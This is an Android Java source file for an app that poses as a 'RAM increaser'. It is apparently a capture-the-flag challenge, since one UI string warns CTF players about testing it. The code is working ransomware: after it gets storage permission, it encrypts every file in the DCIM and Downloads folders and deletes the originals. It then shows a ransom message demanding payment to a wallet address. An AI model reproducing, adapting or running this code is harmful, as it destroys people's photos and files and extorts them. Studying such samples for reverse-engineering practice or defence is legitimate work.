package com.example.ram;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.content.ContextWrapper;
import android.os.Environment;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;




public class MainActivity extends AppCompatActivity {
    public Boolean hacked;

    public Button b;
    public TextView t;

    @Override
    protected void onResume() {
        updateView();
        super.onResume();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        b = findViewById(R.id.button_id);
        t = findViewById(R.id.id_text);
        hacked= false;
        updateView();
        b.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                if (checkPerm()){
                    hacked = true;
                    Toast.makeText(MainActivity.this, "Please wait while ram is installing", Toast.LENGTH_SHORT).show();
                    encryptAll();

                }else {
                    askPerm();
                }
                updateView();
                
            }
        });


    }
    private void updateView(){
        if (hacked){
            b.setVisibility(View.INVISIBLE);
            t.setText("Your photos/downlaods have been encrypted :P\nTo recover them, drop 1337$ in the following wallet\nmvPZWmnGrJgQh6RoFP43uNXw569R9rqzwT");
        }else{
            if(!checkPerm()){
                t.setText("You need to allow access to device storage in order to increase RAM!\nClick on the button below to grant Access");
                b.setText("Allow access");
            }else{
                t.setText("Ready to increase RAM\nIf you are a ctf player testing on your personnal device you should seriously not push the button");
                b.setText("Increase RAM");
            }
        }
    }
    private void askPerm(){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            new B(this);
            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            Uri uri = Uri.fromParts("package", getPackageName(), null);
            intent.setData(uri);
            startActivity(intent);

        }else{
            ActivityCompat.requestPermissions(MainActivity.this, new String[] { Manifest.permission.WRITE_EXTERNAL_STORAGE }, 100);
            ActivityCompat.requestPermissions(MainActivity.this, new String[] { Manifest.permission.READ_EXTERNAL_STORAGE }, 101);
        }

    }

    private boolean checkPerm(){

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if(!Environment.isExternalStorageManager())
            {
                return false;
            }
        }else{
            if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
            {
                return false;
            }
            if(ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
            {
                return false;
            }
        }

        return true;
    }

    private void encryptAll(){
        String duh = (new A(this)).getKey();
        File[] files = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).listFiles();
        for (int i =0; i< files.length; i++){

            doFile(files[i], duh,  1);
        }
        File[] dfiles = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).listFiles();
        for (int i =0; i< dfiles.length; i++){

            doFile(dfiles[i],duh,  2);
        }
    }

    private void doFile(File file,String s,  int i){

        try {
            v(file, s, i);
            file.delete();
        } catch (IOException e) {
            e.printStackTrace();
            Toast.makeText(MainActivity.this, "No permissions, no RAM :(", Toast.LENGTH_SHORT).show();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        }
    }

    private void v(File fichier, String key, int i) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        String des = getResources().getString(R.string.des);
        if(i==3){
            new C(this);
        }

        // on below line creating a variable for file input stream
        FileInputStream fis = new FileInputStream(fichier);

        // on below line creating a variable for context  wrapper.
        ContextWrapper contextWrapper = new ContextWrapper(getApplication());

        // on below line creating a variable for file
        //File docs = contextWrapper.getExternalFilesDir(Environment.DIRECTORY_DCIM);
        File docs;
        if (i==1) {
            docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        }else{
            docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        }
        // on below line creating a file for encrypted file.
        File file = new File(docs, fichier.getName() + ".enc");

        file.createNewFile();
        // on below line creating a variable for file output stream.
        FileOutputStream fos = new FileOutputStream(file.getPath());

        // on below line creating a variable for secret key.
        // creating a variable for secret key and passing our secret key
        // and algorithm for encryption.
        SecretKeySpec sks = new SecretKeySpec(key.getBytes(), des);

        // on below line creating a variable for cipher and initializing it
        Cipher xor = Cipher.getInstance(des);

        // on below line initializing cipher and
        // specifying decrypt mode to encrypt.
        xor.init(Cipher.ENCRYPT_MODE, sks);

        // on below line creating cos
        CipherOutputStream cos = new CipherOutputStream(fos, xor);

        int b;
        byte[] d = new byte[8];
        while ((b = fis.read(d)) != -1) {
            cos.write(d, 0, b);
        }

        // on below line closing
        // our cos and fis.
        cos.flush();
        cos.close();
        fis.close();

    }


}
